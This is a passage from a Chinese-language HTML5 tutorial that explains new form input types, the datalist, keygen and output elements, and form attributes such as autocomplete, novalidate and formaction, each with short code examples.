class="hljs-string">&quot;favcolor&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-2-date"><a href="#3-2-date" class="headerlink" title="3.2 date"></a>3.2 date</h3><p>date 类型允许用户从一个日期选择器选择一个日期。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">生日: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bday&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-3-datetime"><a href="#3-3-datetime" class="headerlink" title="3.3 datetime"></a>3.3 datetime</h3><p>datetime 类型允许用户选择一个日期（UTC 时间）。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">生日 (日期和时间): <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;datetime&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bdaytime&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-4-datetime-local"><a href="#3-4-datetime-local" class="headerlink" title="3.4 datetime-local"></a>3.4 datetime-local</h3><p>datetime-local 类型允许用户选择一个日期和时间 (无时区)。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">生日 (日期和时间): <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;datetime-local&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bdaytime&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-5-email"><a href="#3-5-email" class="headerlink" title="3.5 email"></a>3.5 email</h3><p>email 类型用于应该包含 e-mail 地址的输入域。在提交表单时，会自动验证 email 域的值是否合法有效。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">E-mail: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-6-month"><a href="#3-6-month" class="headerlink" title="3.6 month"></a>3.6 month</h3><p>month 类型允许用户选择一个月份。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">生日 (月和年): <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;month&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bdaymonth&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-7-number"><a href="#3-7-number" class="headerlink" title="3.7 number"></a>3.7 number</h3><p>number 类型用于应该包含数值的输入域。用户还能够设定对所接受的数字的限定。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">数量 ( 1 到 5 之间 ): <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;quantity&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>使用属性来规定对数字类型的限定：</p><ul><li>max- 规定允许的最大值</li><li>min - 规定允许的最小值</li><li>step - 规定合法的数字间隔（如果 step=”3”，则合法的数是 -3,0,3,6 等）</li><li>value - 规定默认值</li></ul><h3 id="3-8-range"><a href="#3-8-range" class="headerlink" title="3.8 range"></a>3.8 range</h3><p>range 类型用于应该包含一定范围内数字值的输入域。range 类型显示为滑动条。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;range&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;points&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>使用属性来规定对数字类型的限定：</p><ul><li>max - 规定允许的最大值</li><li>min - 规定允许的最小值</li><li>step - 规定合法的数字间隔</li><li>value - 规定默认值</li></ul><h3 id="3-9-search"><a href="#3-9-search" class="headerlink" title="3.9 search"></a>3.9 search</h3><p>search 类型用于搜索域，比如站点搜索或 Google 搜索。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Search Google: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;googlesearch&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-10-tel"><a href="#3-10-tel" class="headerlink" title="3.10 tel"></a>3.10 tel</h3><p>定义输入电话号码字段。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">电话号码: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;tel&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usrtel&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-11-time"><a href="#3-11-time" class="headerlink" title="3.11 time"></a>3.11 time</h3><p>time 类型允许你选择一个时间。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">选择时间: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;time&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usr_time&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-12-url"><a href="#3-12-url" class="headerlink" title="3.12 url"></a>3.12 url</h3><p>url 类型用于应该包含 URL 地址的输入域。在提交表单时，会自动验证 url 域的值。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">添加您的URL: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;homepage&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-13-week"><a href="#3-13-week" class="headerlink" title="3.13 week"></a>3.13 week</h3><p>week 类型允许你选择周和年。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">选择周: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;week&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;week_year&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="4-新表单元素"><a href="#4-新表单元素" class="headerlink" title="4.新表单元素"></a>4.新表单元素</h2><p><strong>注意：</strong>不是所有的浏览器都支持HTML5 新的表单元素。</p><h3 id="4-1-datalist"><a href="#4-1-datalist" class="headerlink" title="4.1 datalist"></a>4.1 datalist</h3><p>&lt;datalist&gt; 元素规定输入域的选项列表。<br>&lt;datalist&gt; 属性规定 form 或 input 域应该拥有自动完成功能。当用户在自动完成域中开始输入时，浏览器应该在该域中显示填写的选项。<br>使用 &lt;input&gt; 元素的列表属性与 &lt;datalist&gt; 元素绑定。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">list</span>=<span class="hljs-string">&quot;browsers&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">datalist</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;browsers&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Internet Explorer&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Firefox&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Chrome&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Opera&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Safari&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">datalist</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-keygen"><a href="#4-2-keygen" class="headerlink" title="4.2 keygen"></a>4.2 keygen</h3><p>&lt;keygen&gt; 元素的作用是提供一种验证用户的可靠方法。<br>&lt;keygen&gt;标签规定用于表单的密钥对生成器字段。<br>当提交表单时，会生成两个键，一个是私钥，一个公钥。</p><p>私钥（private key）存储于客户端，公钥（public key）则被发送到服务器。公钥可用于之后验证用户的客户端证书（client certificate）。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo_keygen.asp&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>用户名: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usr_name&quot;</span>&gt;</span><br>加密: <span class="hljs-tag">&lt;<span class="hljs-name">keygen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;security&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-3-output"><a href="#4-3-output" class="headerlink" title="4.3 output"></a>4.3 output</h3><p>&lt;output&gt; 元素用于不同类型的输出，比如计算或脚本输出。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">oninput</span>=<span class="hljs-string">&quot;x.value=parseInt(a.value)+parseInt(b.value)&quot;</span>&gt;</span>0<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;range&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;a&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;50&quot;</span>&gt;</span>100 +<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;b&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;50&quot;</span>&gt;</span>=<br><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;a b&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="5-新表单属性"><a href="#5-新表单属性" class="headerlink" title="5.新表单属性"></a>5.新表单属性</h2><h3 id="5-1-lt-form-gt-新属性"><a href="#5-1-lt-form-gt-新属性" class="headerlink" title="5.1 &lt;form&gt;新属性"></a>5.1 &lt;form&gt;新属性</h3><ul><li>autocomplete</li><li>novalidate</li></ul><h3 id="5-2-lt-input-gt-新属性"><a href="#5-2-lt-input-gt-新属性" class="headerlink" title="5.2 &lt;input&gt;新属性"></a>5.2 &lt;input&gt;新属性</h3><ul><li>autocomplete</li><li>autofocus</li><li>form</li><li>formaction</li><li>formenctype</li><li>formmethod</li><li>formnovalidate</li><li>formtarget</li><li>height and width</li><li>list</li><li>min and max</li><li>multiple</li><li>pattern (regexp)</li><li>placeholder</li><li>required</li><li>step</li></ul><h3 id="5-3-autocomplete-属性（-lt-form-gt-lt-input-gt-）"><a href="#5-3-autocomplete-属性（-lt-form-gt-lt-input-gt-）" class="headerlink" title="5.3 autocomplete 属性（&lt;form&gt; / &lt;input&gt;）"></a>5.3 autocomplete 属性（&lt;form&gt; / &lt;input&gt;）</h3><p>autocomplete 属性规定 form 或 input 域应该拥有自动完成功能。当用户在自动完成域中开始输入时，浏览器应该在该域中显示填写的选项。</p><p>autocomplete 适用于 &lt;form&gt; 标签，以及以下类型的 &lt;input&gt; 标签：text, search, url, telephone, email, password, datepickers, range 以及 color。</p><p><strong>提示：</strong>autocomplete 属性有可能在 form元素中是开启的，而在input元素中是关闭的。</p><p>使用实例：HTML form 中开启 autocomplete (一个 input 字段关闭 autocomplete ).</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;on&quot;</span>&gt;</span><br> First name:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> E-mail: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h3 id="5-4-novalidate-属性（-lt-form-gt-）"><a href="#5-4-novalidate-属性（-lt-form-gt-）" class="headerlink" title="5.4 novalidate 属性（&lt;form&gt;）"></a>5.4 novalidate 属性（&lt;form&gt;）</h3><p>novalidate 属性的一个boolean 属性。novalidate 属性规定在提交表单时不应该验证 form 或 input 域。</p><p>使用实例：无需验证提交的表单数据</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span> <span class="hljs-attr">novalidate</span>&gt;</span><br> E-mail: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_email&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-5-autofocus-属性（-lt-input-gt-）"><a href="#5-5-autofocus-属性（-lt-input-gt-）" class="headerlink" title="5.5 autofocus 属性（&lt;input&gt;）"></a>5.5 autofocus 属性（&lt;input&gt;）</h3><p>autofocus 属性是一个 boolean 属性。autofocus 属性规定在页面加载时，域自动地获得焦点。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">First name:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span> <span class="hljs-attr">autofocus</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-6-form-属性（-lt-input-gt-）"><a href="#5-6-form-属性（-lt-input-gt-）" class="headerlink" title="5.6 form 属性（&lt;input&gt;）"></a>5.6 form 属性（&lt;input&gt;）</h3><p>form 属性规定输入域所属的一个或多个表单。如需引用一个以上的表单，需要使用空格分隔的列表。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form1&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span> <span class="hljs-attr">form</span>=<span class="hljs-string">&quot;form1&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>“Last name” 字段没有在form表单之内，但它也是form表单的一部分。</p><h3 id="5-7-formaction-属性（-lt-input-gt-）"><a href="#5-7-formaction-属性（-lt-input-gt-）" class="headerlink" title="5.7 formaction 属性（&lt;input&gt;）"></a>5.7 formaction 属性（&lt;input&gt;）</h3><p>formaction 属性用于描述表单提交的URL地址。<br>formaction 属性会覆盖&lt;form&gt; 元素中的action属性。formaction 属性用于 type=”submit” 和 type=”image”。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">&quot;demo-admin.php&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit as admin&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-8-formenctype-属性（-lt-input-gt-）"><a href="#5-8-formenctype-属性（-lt-input-gt-）" class="headerlink" title="5.8 formenctype 属性（&lt;input&gt;）"></a>5.8 formenctype 属性（&lt;input&gt;）</h3><p>formenctype 属性描述了表单提交到服务器的数据编码 (只对form表单中 method=”post” 表单)。该属性与 type=”submit” 和 type=”image” 配合使用。formenctype 属性覆盖 form 元素的 enctype 属性。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-post_enctype.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formenctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit as Multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-9-formmethod-属性（-lt-input-gt-）"><a href="#5-9-formmethod-属性（-lt-input-gt-）" class="headerlink" title="5.9 formmethod 属性（&lt;input&gt;）"></a>5.9 formmethod 属性（&lt;input&gt;）</h3><p>formmethod 属性定义了表单提交的方式。该属性可以与 type=”submit” 和 type=”image” 配合使用。<br>formmethod 属性覆盖了 &lt;form&gt; 元素的的method 属性。</p><p>使用实例：重新定义表单提交方式实例</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formmethod</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">&quot;demo-post.php&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit using POST&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-10-formnovalidate-属性（-lt-input-gt-）"><a href="#5-10-formnovalidate-属性（-lt-input-gt-）" class="headerlink" title="5.10 formnovalidate 属性（&lt;input&gt;）"></a>5.10 formnovalidate 属性（&lt;input&gt;）</h3><p>novalidate 属性是一个 boolean 属性。novalidate属性描述了 &lt;input&gt; 元素在表单提交时无需被验证。formnovalidate 属性会覆盖 &lt;form&gt; 元素的novalidate属性。formnovalidate 属性与type=”submit”一起使用。</p><p>使用实例：两个提交按钮的表单(使用与不适用验证 )</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span>&gt;</span><br> E-mail: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userid&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formnovalidate</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit without validation&quot;</span>&gt;</span><br><span 